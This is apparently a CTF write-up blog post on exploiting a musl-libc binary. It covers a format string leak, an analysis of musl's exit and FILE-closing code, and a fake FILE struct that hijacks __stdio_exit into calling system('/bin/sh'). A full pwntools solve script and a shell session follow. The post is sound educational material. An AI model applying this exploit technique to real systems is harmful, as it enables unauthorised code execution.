[{"content":"A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named www-0. The main twist of the challenge was that it\u0026rsquo;s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we\u0026rsquo;ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures.\nChallenge Overview Download Challenge Files\nYou can follow along and try the challenge for yourself if you want to by clicking the download link above. The challenge files include the binary, its source code, and the corresponding Docker files to spin up your own instance. The source code is as follows.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void gift() { char buf[1024] = {0}; scanf(\u0026#34; %32[^$n\\n]\u0026#34;, buf); printf(buf); putchar(\u0026#39;\\n\u0026#39;); } int main() { gift(); long long *ptr; printf(\u0026#34;Where: \u0026#34;); fflush(stdout); scanf(\u0026#34;%p\u0026#34;, \u0026amp;ptr); printf(\u0026#34;What: \u0026#34;); fflush(stdout); scanf(\u0026#34;%lli\u0026#34;, ptr); exit(0); } [*] \u0026#39;/home/nouxia/ctf/arkavidia/pwn/www-0/chall\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes As a summary, the program will:\nAsk the user for some input, which is then immediately passed into a printf call, resulting in a format string vulnerability. Ask the user for an arbitrary address. Ask the user for an 8-byte integer, which will be written to the aforementioned address. The challenge is quite simple and the vulnerability is very obvious, but it\u0026rsquo;ll be somewhat tricky to exploit.\nLeaking Libc The challenge imposes a constraint on the string you\u0026rsquo;re allowed to input. The string must be at most 32 characters long and mustn\u0026rsquo;t contain $ or n. This poses some difficulty as you usually use$ to specify the offset when trying to leak values off the stack. To get around this, we can use multiple format specifiers to simulate leaking an offset. For example, to leak %5$p, we can send in %p%p%p%p%p and the 5th %p will correspond to the value on the stack at offset 5.\nWith that out of the way, first things first we need to find the offset of our input buffer, as standard for most format string vulnerabilities.\n$ ./chall_patched AAAAAAAA%p%p%p%p%p%p AAAAAAAA00x140x5d0x7ffd12e35bb000x4141414141414141 Where: We find that our buffer sits at offset 6. With this in mind, we can craft the final format string. As mentioned before, we\u0026rsquo;ll send in a GOT entry along with a %s format at the right offset to leak a libc address.\n1 2 3 4 5 6 7 payload = flat( b\u0026#39;%p%p%p%p%p%p%p%p|%s\u0026#39;.ljust(24, b\u0026#39;.\u0026#39;), exe.got[\u0026#39;putchar\u0026#39;], ) io.sendline(payload) io.recvuntil(b\u0026#39;|\u0026#39;) libc_leak = u64(io.recv(6).ljust(8, b\u0026#39;\\0\u0026#39;)) [+] Starting local process \u0026#39;/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched\u0026#39;: pid 186020 [+] hex(libc_leak) = \u0026#39;0x70383b2f8418\u0026#39; [*] Switching to interactive mode .....\\xa0?@ Where: $ pwndbg\u0026gt; vmmap 0x7914c2902418 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File 0x7914c28a0000 0x7914c28b4000 r--p 14000 0 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 ► 0x7914c28b4000 0x7914c290b000 r-xp 57000 14000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 +0x4e418 0x7914c290b000 0x7914c2941000 r--p 36000 6b000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 pwndbg\u0026gt; distance 0x7914c2902418 0x7914c28a0000 0x7914c2902418-\u0026gt;0x7914c28a0000 is -0x62418 bytes (-0xc483 words) pwndbg\u0026gt; Awesome, we now have obtained the libc base address. Moving on, let\u0026rsquo;s explore what we can do with an 8-byte overwrite. Notice how after the program writes our 8 bytes, it immediately calls exit(0). So let\u0026rsquo;s start there. Let\u0026rsquo;s explore what actually happens when a program calls exit.\nWhat Happens when exit() is Called? To answer this question, let\u0026rsquo;s take a look at the musl source code. To provide context for the next section, our final plan will revolve around crafting a fake FILE struct, such that system(\u0026quot;/bin/sh\u0026quot;) will be called when that file is closed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // File: src/exit/exit.c #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026#34;libc.h\u0026#34; #include \u0026#34;pthread_impl.h\u0026#34; #include \u0026#34;atomic.h\u0026#34; #include \u0026#34;syscall.h\u0026#34; ... _Noreturn void exit(int code) { /* Handle potentially concurrent or recursive calls to exit, * whose behaviors have traditionally been undefined by the * standards. Using a custom lock here avoids pulling in lock * machinery and lets us trap recursive calls while supporting * multiple threads contending to be the one to exit(). */ static volatile int exit_lock[1]; int tid = __pthread_self()-\u0026gt;tid; int prev = a_cas(exit_lock, 0, tid); if (prev == tid) a_crash(); else if (prev) for (;;) __sys_pause(); __funcs_on_exit(); __libc_exit_fini(); __stdio_exit(); _Exit(code); } There are 3 functions that can be of our interest here, __funcs_on_exit, __libc_exit_fini, and __stdio_exit. However, so this post doesn\u0026rsquo;t become too long, I\u0026rsquo;ll only be talking about __stdio_exit, which is be the function we\u0026rsquo;ll be taking advantage of for our exploit. But as a general overview, __funcs_on_exit is where the functions registered by atexit will be called, and __libc_exit_fini is equivalent to _dl_fini on glibc. Below is the source code for __stdio_exit and __ofl_lock, one of the functions called within it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // File: src/stdio/ofl.c #include \u0026#34;stdio_impl.h\u0026#34; #include \u0026#34;lock.h\u0026#34; #include \u0026#34;fork_impl.h\u0026#34; static FILE *ofl_head; static volatile int ofl_lock[1]; volatile int *const __stdio_ofl_lockptr = ofl_lock; FILE **__ofl_lock() { LOCK(ofl_lock); return \u0026amp;ofl_head; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // File: src/stdio/__stdio_exit.c #include \u0026#34;stdio_impl.h\u0026#34; static FILE *volatile dummy_file = 0; weak_alias(dummy_file, __stdin_used); weak_alias(dummy_file, __stdout_used); weak_alias(dummy_file, __stderr_used); static void close_file(FILE *f) { if (!f) return; FFINALLOCK(f); if (f-\u0026gt;wpos != f-\u0026gt;wbase) f-\u0026gt;write(f, 0, 0); if (f-\u0026gt;rpos != f-\u0026gt;rend) f-\u0026gt;seek(f, f-\u0026gt;rpos-f-\u0026gt;rend, SEEK_CUR); } void __stdio_exit(void) { FILE *f; for (f=*__ofl_lock(); f; f=f-\u0026gt;next) close_file(f); close_file(__stdin_used); close_file(__stdout_used); close_file(__stderr_used); } The function __stdio_exit is responsible for closing all open FILE handles. Furthermore, __ofl_lock will return the head of the linked list containing all open FILE handles, similar to _IO_list_all in glibc. After that, each FILE in the list will be closed one by one followed by stdin, stdout, and stderr.\nThe key thing to observe here is the calls to f-\u0026gt;write and f-\u0026gt;seek in close_file. The write and seek members of the FILE struct are overwritable pointers. So, if we can insert a pointer to system into either write or seek, we will successfully call system when that FILE is closed. However, we need to ensure that f-\u0026gt;wpos != f-\u0026gt;wbase or f-\u0026gt;rpos != f-\u0026gt;rend so that the function will be called. To find out the needed offsets in the FILE struct, let\u0026rsquo;s take a look at the disassembly of close_file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pwndbg\u0026gt; x/30i 0x7ffff7fb829a 0x7ffff7fb829a: test rdi,rdi 0x7ffff7fb829d: je 0x7ffff7fb82e9 0x7ffff7fb829f: push rbx 0x7ffff7fb82a0: mov eax,DWORD PTR [rdi+0x8c] 0x7ffff7fb82a6: mov rbx,rdi 0x7ffff7fb82a9: test eax,eax 0x7ffff7fb82ab: jns 0x7ffff7fb82e0 0x7ffff7fb82ad: mov rax,QWORD PTR [rbx+0x38] 0x7ffff7fb82b1: cmp QWORD PTR [rbx+0x28],rax // if (f-\u0026gt;wpos != f-\u0026gt;wbase) 0x7ffff7fb82b5: je 0x7ffff7fb82c1 0x7ffff7fb82b7: xor edx,edx 0x7ffff7fb82b9: xor esi,esi 0x7ffff7fb82bb: mov rdi,rbx 0x7ffff7fb82be: call QWORD PTR [rbx+0x48] // f-\u0026gt;write(f, 0, 0); We find that wpos is located at FILE+0x28, wbase at FILE+0x38, and write at FILE+0x48. Alrighty, so to call system(\u0026quot;/bin/sh\u0026quot;), our fake FILE must have:\nFILE+0x0 equal to \u0026quot;/bin/sh\u0026quot; in its integer representation. We need this because the first argument to f-\u0026gt;write is our FILE itself. wpos != wbase or FILE+0x28 != FILE+0x38 write or FILE+0x48 equal to system After making our fake FILE, the last thing we need to do is to overwrite ofl_head such that it points to it. Note that here I choose to overwrite f-\u0026gt;write, but the same principles apply should you choose to overwrite f-\u0026gt;seek.\nHow do We Write Our Fake FILE? But wait, the FILE struct is huge, and we can only write 8 bytes at a time. So, what\u0026rsquo;s the solution? Fortunately, stdin in this challenge is buffered. When a file stream is buffered, any input intended for it is explicitly stored in a memory buffer. We can see this for ourselves in the following example.\npwndbg\u0026gt; disass gift Dump of assembler code for function gift: ... 0x000000000040125d \u0026lt;+45\u0026gt;: lea rdi,[rip+0xd9c] # 0x402000 =\u0026gt; 0x0000000000401264 \u0026lt;+52\u0026gt;: call 0x401060 \u0026lt;scanf@plt\u0026gt; 0x0000000000401269 \u0026lt;+57\u0026gt;: mov rdi,rsp ... End of assembler dump. pwndbg\u0026gt; b *(gift+57) Breakpoint 3 at 0x401269 pwndbg\u0026gt; r Starting program: /home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched AAAAAAAA Here, I set a breakpoint right after a scanf call, then I sent in 8 \u0026quot;A\u0026quot;s\npwndbg\u0026gt; search AAAAAAAA Searching for byte: b\u0026#39;AAAAAAAA\u0026#39; [anon_7ffff7ffc] 0x7ffff7ffc2e8 \u0026#39;AAAAAAAA\\n\u0026#39; [stack] 0x7fffffffd270 \u0026#39;AAAAAAAA\u0026#39; pwndbg\u0026gt; vmmap 0x7ffff7ffc2e8 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA Start End Perm Size Offset File 0x7ffff7ffb000 0x7ffff7ffc000 rw-p 1000 a1000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 ► 0x7ffff7ffc000 0x7ffff7fff000 rw-p 3000 0 [anon_7ffff7ffc] +0x2e8 pwndbg\u0026gt; x/gx \u0026amp;stdin 0x7ffff7ffad60 \u0026lt;stdin\u0026gt;: 0x00007ffff7ffb180 pwndbg\u0026gt; x/20gx 0x00007ffff7ffb180 0x7ffff7ffb180: 0x0000000000000009 0x00007ffff7ffc2f0 0x7ffff7ffb190: 0x00007ffff7ffc2f1 0x00007ffff7fb8277 0x7ffff7ffb1a0: 0x0000000000000000 0x0000000000000000 0x7ffff7ffb1b0: 0x0000000000000000 0x0000000000000000 0x7ffff7ffb1c0: 0x00007ffff7fb832b 0x0000000000000000 0x7ffff7ffb1d0: 0x00007ffff7fb83f6 0x00007ffff7ffc2e8 \u0026lt;-- This is where our \u0026#34;AAAAAAAA\u0026#34; is stored. As a matter of fact, this address is the buffer used for stdin 0x7ffff7ffb1e0: 0x0000000000000400 0x0000000000000000 0x7ffff7ffb1f0: 0x0000000000000000 0x0000000000000000 0x7ffff7ffb200: 0x0000000000000000 0xffffffffffffffff 0x7ffff7ffb210: 0x0000000000000000 0x0000000000000000 pwndbg\u0026gt; After that, I searched the memory space for those 8 \u0026quot;A\u0026quot;s and found that it\u0026rsquo;s stored in 2 places. One in the stack and the other in some place near libc. After further investigation, it can be found that this \u0026ldquo;some place\u0026rdquo; is actually the buffer used for stdin. If stdin were unbuffered in this challenge, those 8 \u0026quot;A\u0026quot;s would be discarded after it\u0026rsquo;s been processed and wouldn\u0026rsquo;t be stored in memory.\nSo, knowing this, we can insert our fake FILE right after our normal input to scanf. Then, we overwrite ofl_head to point to the stdin buffer. With this setup, system(\u0026quot;/bin/sh\u0026quot;) will be called when __stdio_exit is executed.\nSolve Script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 #!/usr/bin/env python3 # -*- coding: utf-8 -*- from pwn import * context.terminal = \u0026#39;wt.exe wsl -d Ubuntu\u0026#39;.split() exe = context.binary = ELF(args.EXE or \u0026#39;./chall_patched\u0026#39;) host = args.HOST or \u0026#39;localhost\u0026#39; port = int(args.PORT or 8002) if args.LOCAL_LIBC: libc = exe.libc elif args.LOCAL: library_path = libcdb.download_libraries(\u0026#39;ld-musl-x86_64.so.1\u0026#39;) if library_path: exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path) libc = exe.libc else: libc = ELF(\u0026#39;ld-musl-x86_64.so.1\u0026#39;) else: libc = ELF(\u0026#39;ld-musl-x86_64.so.1\u0026#39;) def start_local(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Execute the target binary locally\u0026#39;\u0026#39;\u0026#39; if args.GDB: return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe.path] + argv, *a, **kw) def start_remote(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Connect to the process on the remote host\u0026#39;\u0026#39;\u0026#39; io = connect(host, port) if args.GDB: gdb.attach(io, gdbscript=gdbscript) return io def start(argv=[], *a, **kw): \u0026#39;\u0026#39;\u0026#39;Start the exploit against the target.\u0026#39;\u0026#39;\u0026#39; if args.LOCAL: return start_local(argv, *a, **kw) else: return start_remote(argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; b *(main+118) continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) # -- Exploit goes here -- io = start() # Leak musl address payload = flat( b\u0026#39;%p%p%p%p%p%p%p%p|%s\u0026#39;.ljust(24, b\u0026#39;.\u0026#39;), exe.got[\u0026#39;putchar\u0026#39;], ) io.sendline(payload) io.recvuntil(b\u0026#39;|\u0026#39;) libc_leak = u64(io.recv(6).ljust(8, b\u0026#39;\\0\u0026#39;)) libc_address = libc_leak - 0x62418 system = libc_address + 0x5bb7e ofl_head = libc_address + 0xa4e88 scanf_buf = libc_address + 0xa32e8 log.success(f\u0026#39;{hex(libc_leak) = }\u0026#39;) log.success(f\u0026#39;{hex(libc_address) = }\u0026#39;) log.success(f\u0026#39;{hex(ofl_head) = }\u0026#39;) log.success(f\u0026#39;{hex(scanf_buf) = }\u0026#39;) # Create a fake file and overwrite ofl_head to point to it io.sendlineafter(b\u0026#39;Where: \u0026#39;, hex(ofl_head).encode()) io.sendlineafter(b\u0026#39;What: \u0026#39;, flat( (str(scanf_buf + 0x10).encode() + b\u0026#39;\\n\u0026#39;).ljust(16, b\u0026#39;\\0\u0026#39;), int.from_bytes(b\u0026#39;/bin/sh\\0\u0026#39;, \u0026#39;little\u0026#39;), 4 * p64(0x0), 0x0, # wpos 0x0, 0x1, # wbase 0x0, # read system, # write )) io.interactive() $ ./solve.py [*] \u0026#39;/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes [*] \u0026#39;/home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to localhost on port 8002: Done [+] hex(libc_leak) = \u0026#39;0x7add684b6418\u0026#39; [+] hex(libc_address) = \u0026#39;0x7add68454000\u0026#39; [+] hex(ofl_head) = \u0026#39;0x7add684f8e88\u0026#39; [+] hex(scanf_buf) = \u0026#39;0x7add684f72e8\u0026#39; [*] Switching to interactive mode $ ls chall flag.txt $ cat flag.txt flag{test} $ References musl source code - https://github.com/kraj/musl ","permalink":"http://localhost:1313/posts/musl-fsop-arkavidia-2025/","summary":"\u003cp\u003eA couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named \u003ccode\u003ewww-0\u003c/code\u003e. The main twist of the challenge was that it\u0026rsquo;s run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we\u0026rsquo;ll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures.\u003c/p\u003e","title":"File Stream Oriented Programming (FSOP) on Musl Libc"}]